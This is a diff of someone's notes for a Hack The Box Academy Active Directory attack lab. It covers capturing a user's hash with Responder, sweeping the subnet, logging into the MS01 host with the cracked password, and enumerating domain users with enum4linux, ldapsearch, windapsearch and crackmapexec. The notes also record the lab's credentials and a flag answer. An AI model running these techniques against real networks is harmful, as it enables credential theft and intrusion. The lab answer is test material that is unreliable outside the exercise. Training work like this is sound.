@@ -7,7 +7,7 @@ sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.11.74
 
 xfreerdp
 ```go
-xfreerdp /v:10.129.11.74 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
+xfreerdp /v:10.129.12.127 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
 ```
 
 #### Question 1: Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
@@ -16,7 +16,7 @@ xfreerdp /v:10.129.11.74 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/hom
 Log into the host. The user can sudo on everything. Use responder to grab a hash within the 172.16.6.0 subnet
 
 ```go
-sudo responder -I ens224 -frw
+sudo responder -I ens224 -wfrv
 ```
 
 Username and hash
@@ -42,6 +42,71 @@ weasal
 
 #### Question 3: Submit the contents of the C:\flag.txt file on MS01.
 
+Find other hosts on the network from this host
 ```go
+for i in {1..254} ;do (ping -c 1 172.16.7.$i | grep "bytes from" &) ;done
+```
 
+![[Pasted image 20260531005943.png]]
+
+Determine which host is MS01
+
+```go
+172.16.7.50
+```
+
+NMAP scan for 172.16.7.50 shows this is MS01
+![[Pasted image 20260531010900.png]]
+
+
+```go
+xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
+```
+
+Answer:
+```go
+aud1t_gr0up_m3mbersh1ps!
+```
+
+>[!Tip] Who is 172.16.7.60?
+>
+
+NMAP Scan for 172.16.7.60 shows it's name as `SQL01`
+![[Pasted image 20260531011220.png]]
+
+#### Question 4: Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
+
+
+Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executablecd ..
+
+```go
+scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.15.101:~/Desktop/HTB
+```
+
+>[!Warning] "$DISPLAY environment variable not properly set" error message
+> I got the above error message when attempting to RDP into the MS01 host. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags
+
+password
+```go
+HTB_@cademy_stdnt!
+```
+
+```go
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HTB,/home/htb-student/Desktop/HTB /smart-sizing:2400x1200 /cert:ignore
+```
+
+```go
+enum4linux -U 172.16.7.50 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+```go
+ldapsearch -h 172.16.7.50 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+```
+
+```go
+./windapsearch.py --dc-ip 172.16.7.50 -u "" -U
+```
+
+```go
+sudo crackmapexec smb 172.16.7.50 -u htb-student -p HTB_@cademy_stdnt! --users
 ```
